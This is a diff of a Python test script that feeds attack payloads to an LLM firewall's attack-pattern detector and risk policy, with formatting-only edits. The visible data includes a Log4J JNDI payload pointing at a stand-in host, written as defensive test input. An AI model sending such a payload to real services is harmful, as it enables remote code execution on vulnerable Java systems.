@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """TEST ATTACK PATTERNS - SOFORT"""
+
 import os
 import sys
 
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
 
 from llm_firewall.detectors.attack_patterns import scan_attack_patterns
 from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
@@ -16,9 +17,9 @@ attacks = [
     ("Log4J", "${jndi:ldap://attacker.com/exploit}"),
 ]
 
-print("="*70)
+print("=" * 70)
 print("ATTACK PATTERN DETECTOR TEST")
-print("="*70)
+print("=" * 70)
 
 for category, payload in attacks:
     attack_hits = scan_attack_patterns(payload)
@@ -30,7 +31,6 @@ for category, payload in attacks:
     print(f"  Risk: {risk:.3f}")
     print(f"  Action: {action}")
 
-print("\n" + "="*70)
+print("\n" + "=" * 70)
 print("TESTING IF FIXED")
-print("="*70)
-
+print("=" * 70)
